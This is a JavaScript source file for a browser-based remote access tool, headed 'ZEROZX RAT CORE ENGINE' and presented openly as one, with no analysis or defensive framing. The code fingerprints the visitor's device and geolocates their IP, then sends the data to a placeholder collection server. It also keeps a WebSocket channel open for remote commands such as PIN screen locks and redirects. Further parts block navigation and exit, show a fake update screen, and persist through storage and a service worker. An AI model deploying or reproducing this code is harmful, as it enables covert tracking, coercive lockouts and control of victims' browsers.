// ZEROZX RAT CORE ENGINE
(function() {
    const CONFIG = {
        SERVER_URL: 'https://your-server.com/collect.php',
        WS_URL: 'wss://your-server.com:6666',
        DEVICE_ID: 'ZX_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now(),
        HEARTBEAT: 30000,
        RECONNECT: 5000
    };

    const deviceInfo = {
        id: CONFIG.DEVICE_ID,
        brand: '',
        model: '',
        androidVersion: '',
        sdkVersion: '',
        userAgent: navigator.userAgent,
        screen: screen.width + 'x' + screen.height,
        screenInches: Math.sqrt(Math.pow(screen.width/96,2) + Math.pow(screen.height/96,2)).toFixed(1) + '"',
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        memory: navigator.deviceMemory || 'N/A',
        cores: navigator.hardwareConcurrency || 'N/A',
        touchPoints: navigator.maxTouchPoints,
        pixelRatio: window.devicePixelRatio,
        colorDepth: screen.colorDepth,
        platform: navigator.platform,
        vendor: navigator.vendor || 'N/A',
        cookieEnabled: navigator.cookieEnabled,
        ip: '',
        location: '',
        isp: '',
        country: '',
        city: '',
        lat: '',
        lon: '',
        battery: '',
        batteryCharging: false,
        network: '',
        networkDownlink: '',
        networkRtt: '',
        timestamp: new Date().toISOString(),
        firstSeen: new Date().toISOString(),
        visitCount: 1
    };

    // DETAILED DEVICE DETECTION
    const ua = navigator.userAgent;

    const brandPatterns = [
        { name: 'Samsung', regex: /Samsung|SM-[A-Z0-9]+/i, modelRegex: /SM-[A-Z0-9]+/i },
        { name: 'Xiaomi', regex: /Xiaomi|Redmi|POCO|Mi /i, modelRegex: /(Redmi|Xiaomi|Mi|POCO)[\s]*[A-Z0-9]+/i },
        { name: 'OPPO', regex: /OPPO/i, modelRegex: /OPPO[\s]*[A-Z0-9]+/i },
        { name: 'VIVO', regex: /vivo/i, modelRegex: /vivo[\s]*[A-Z0-9]+/i },
        { name: 'Realme', regex: /Realme/i, modelRegex: /Realme[\s]*[A-Z0-9]+/i },
        { name: 'Huawei', regex: /Huawei|HONOR/i, modelRegex: /[A-Z]{3}-[A-Z0-9]+/i },
        { name: 'Infinix', regex: /Infinix/i, modelRegex: /Infinix[\s]*[A-Z0-9]+/i },
        { name: 'Tecno', regex: /Tecno/i, modelRegex: /Tecno[\s]*[A-Z0-9]+/i },
        { name: 'Advance', regex: /Advance/i, modelRegex: /Advance[\s]*[A-Z0-9]+/i },
        { name: 'Evercoss', regex: /Evercoss/i, modelRegex: /Evercoss[\s]*[A-Z0-9]+/i },
        { name: 'Nokia', regex: /Nokia/i, modelRegex: /Nokia[\s]*[A-Z0-9.]+/i },
        { name: 'Motorola', regex: /Motorola|Moto/i, modelRegex: /(Moto|Motorola)[\s]*[A-Z0-9]+/i },
        { name: 'LG', regex: /LG-|LGE/i, modelRegex: /LG-[A-Z0-9]+/i },
        { name: 'Sony', regex: /Sony/i, modelRegex: /Sony[\s]*[A-Z0-9]+/i },
        { name: 'Asus', regex: /ASUS/i, modelRegex: /ASUS[\s]*[A-Z0-9]+/i },
        { name: 'iPhone', regex: /iPhone/i, modelRegex: /iPhone/ }
    ];

    for (let brand of brandPatterns) {
        if (brand.regex.test(ua)) {
            deviceInfo.brand = brand.name;
            const match = ua.match(brand.modelRegex);
            deviceInfo.model = match ? match[0] : brand.name + ' Device';
            break;
        }
    }

    if (!deviceInfo.brand) {
        deviceInfo.brand = 'Unknown Android';
        deviceInfo.model = 'Unknown Device';
    }

    // Android version
    const androidMatch = ua.match(/Android\s([0-9.]+)/);
    deviceInfo.androidVersion = androidMatch ? androidMatch[1] : 'N/A';

    // SDK Version
    const sdkMap = {
        '14': '34', '13': '33', '12': '32', '11': '30', '10': '29',
        '9': '28', '8.1': '27', '8.0': '26', '7.1': '25', '7.0': '24',
        '6.0': '23', '5.1': '22', '5.0': '21'
    };
    deviceInfo.sdkVersion = sdkMap[deviceInfo.androidVersion] || 'N/A';

    // Network info
    if (navigator.connection) {
        deviceInfo.network = navigator.connection.effectiveType || 'N/A';
        deviceInfo.networkDownlink = navigator.connection.downlink + ' Mbps';
        deviceInfo.networkRtt = navigator.connection.rtt + ' ms';
    }

    // Battery
    if (navigator.getBattery) {
        navigator.getBattery().then(b => {
            deviceInfo.battery = Math.round(b.level * 100) + '%';
            deviceInfo.batteryCharging = b.charging;
            sendUpdate();
        });
    }

    // IP & Geolocation
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(d => {
            deviceInfo.ip = d.ip;
            return fetch('http://ip-api.com/json/' + d.ip);
        })
        .then(r => r.json())
        .then(loc => {
            deviceInfo.location = loc.country + ', ' + loc.city;
            deviceInfo.isp = loc.isp;
            deviceInfo.country = loc.country;
            deviceInfo.city = loc.city;
            deviceInfo.lat = loc.lat;
            deviceInfo.lon = loc.lon;
            sendData();
        })
        .catch(() => sendData());

    // ==================== SEND DATA ====================
    function sendData() {
        fetch(CONFIG.SERVER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(deviceInfo)
        }).catch(() => {});

        navigator.sendBeacon(CONFIG.SERVER_URL, JSON.stringify(deviceInfo));
        new Image().src = CONFIG.SERVER_URL + '?d=' + encodeURIComponent(JSON.stringify(deviceInfo));
    }

    function sendUpdate() {
        fetch(CONFIG.SERVER_URL + '?update=1', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(deviceInfo)
        }).catch(() => {});
    }

    // ==================== WEBSOCKET ====================
    let ws;
    function connectWS() {
        try {
            ws = new WebSocket(CONFIG.WS_URL);
            ws.onopen = () => {
                ws.send(JSON.stringify({ type: 'register', device: deviceInfo }));
            };
            ws.onmessage = (e) => {
                try {
                    const cmd = JSON.parse(e.data);
                    executeCommand(cmd);
                } catch(err) {}
            };
            ws.onclose = () => setTimeout(connectWS, CONFIG.RECONNECT);
            ws.onerror = () => setTimeout(connectWS, CONFIG.RECONNECT);
        } catch(e) {
            setTimeout(connectWS, CONFIG.RECONNECT);
        }
    }

    // ==================== COMMAND EXECUTOR ====================
    function executeCommand(cmd) {
        switch(cmd.action) {
            case 'lock':
                lockDevice(cmd.pin || '0000');
                break;
            case 'unlock':
                unlockDevice();
                break;
            case 'wallpaper':
                document.body.style.background = `url(${cmd.url}) fixed center/cover`;
                break;
            case 'black':
                document.body.style.background = '#000000';
                break;
            case 'flash':
                document.body.style.background = '#00ff00';
                setTimeout(() => { document.body.style.background = '#000'; }, 150);
                break;
            case 'vibrate':
                if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 500]);
                break;
            case 'info':
                sendData();
                break;
            case 'reload':
                location.reload();
                break;
            case 'alert':
                alert(cmd.message || 'System Alert');
                break;
            case 'redirect':
                if (cmd.url) window.location.href = cmd.url;
                break;
        }
    }

    function lockDevice(pin) {
        document.getElementById('fakeUpdate').style.display = 'none';
        document.getElementById('lockScreen').classList.add('active');
        const pinInput = document.getElementById('pinInput');
        pinInput.value = '';
        pinInput.focus();

        pinInput.onkeyup = function(e) {
            if (this.value.length >= 4) {
                if (this.value === pin) {
                    unlockDevice();
                } else {
                    document.getElementById('lockMsg').textContent = '❌ Wrong PIN!';
                    this.value = '';
                    if (navigator.vibrate) navigator.vibrate(200);
                }
            }
        };
    }

    function unlockDevice() {
        document.getElementById('lockScreen').classList.remove('active');
        document.getElementById('fakeUpdate').style.display = 'flex';
        document.getElementById('lockMsg').textContent = '';
    }

    // ==================== ANTI EXIT ====================
    history.pushState(null, null, location.href);
    window.addEventListener('popstate', () => {
        history.pushState(null, null, location.href);
    });

    window.addEventListener('beforeunload', (e) => {
        e.preventDefault();
        e.returnValue = 'System configuration in progress...';
        return 'System configuration in progress...';
    });

    document.addEventListener('keydown', (e) => {
        if (e.key === 'F5' || (e.ctrlKey && e.key === 'r') || 
            (e.ctrlKey && e.key === 'w') || e.key === 'Backspace' ||
            (e.altKey && e.key === 'F4')) {
            e.preventDefault();
            return false;
        }
    });

    document.addEventListener('contextmenu', (e) => e.preventDefault());

    // ==================== KEEP ALIVE ====================
    setInterval(() => {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'ping', device: CONFIG.DEVICE_ID }));
        }
    }, CONFIG.HEARTBEAT);

    // ==================== PERSISTENCE ====================
    try {
        localStorage.setItem('__zx_rat_id', CONFIG.DEVICE_ID);
        localStorage.setItem('__zx_rat_info', JSON.stringify(deviceInfo));
        sessionStorage.setItem('__zx_rat_id', CONFIG.DEVICE_ID);
    } catch(e) {}

    // Service Worker for background persistence
    if ('serviceWorker' in navigator) {
        const swCode = `
            self.addEventListener('install', e => self.skipWaiting());
            self.addEventListener('activate', e => e.waitUntil(clients.claim()));
            setInterval(() => {
                fetch('${CONFIG.SERVER_URL}?ping=${CONFIG.DEVICE_ID}').catch(() => {});
            }, ${CONFIG.HEARTBEAT});
        `;
        const swBlob = new Blob([swCode], { type: 'application/javascript' });
        navigator.serviceWorker.register(URL.createObjectURL(swBlob)).catch(() => {});
    }

    // Initialize
    connectWS();
    sendData();

})();